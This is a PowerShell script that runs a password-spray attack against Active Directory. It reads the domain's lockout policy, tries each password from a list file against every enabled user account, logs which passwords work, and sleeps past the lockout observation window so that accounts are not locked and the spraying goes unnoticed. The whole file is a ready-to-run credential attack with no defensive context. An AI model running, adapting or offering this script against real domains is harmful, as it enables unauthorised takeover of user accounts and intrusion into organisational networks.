$Domain = Get-ADDomain
$Credentials = ''
$PasswordList = Get-Content C:\temp\pwlist.txt
$PasswordLog = "C:\temp\pwlog.txt"
$UserList = Get-ADUser -Properties samAccountName, BadPWDCount -Filter {Enabled -eq $true}

$PwPolicy = Get-ADDefaultDomainPasswordPolicy
$LockWindow = $PwPolicy.LockoutObservationWindow.TotalSeconds
$LockThreshold = $PwPolicy.LockoutThreshold
$LoopCount = 0

Foreach($PassToTest in $PasswordList){
    $SecurePassword = ConvertTo-SecureString -String $PassToTest -AsPlainText -Force

    Foreach($User in $UserList) {
    $UserDomain = $Domain.Name+'\'+$User.SamAccountName
    $Credentials = New-Object System.Management.Automation.PSCredential $UserDomain, $SecurePassword
        try {
        $performPwdSpray = Get-ADUser -Filter * -Credential $Credentials
        $foundText = "Pwd found: " + $PassToTest + " -> " + $User.SamAccountName + " -> " + $User.BadPWDCount
        Write-Host $foundText -ForegroundColor Green
        Add-Content -Path $PasswordLog -Value $foundText
        }
        catch {
        $notFoundText = "Pwd not found: " + $PassToTest + " -> " + $User.SamAccountName + " -> " + $User.BadPWDCount
        Write-Host $notFoundText -ForegroundColor Red
        Add-Content -Path $PasswordLog -Value $notFoundText
        }
    }

     
     $LoopCount = $LoopCount + 1
     If ($LoopCount -ge ($LockThreshold - 1)) {
        $LoopCount = 0
        Write-Host "Waiting " (($LockWindow + 30)/60) " Minuten"
        $Date = Get-Date
        Write-Host "Next spray attack: " $Date.AddSeconds($LockWindow + 30)
        Start-Sleep -Seconds ($LockWindow + 30)
     }
}
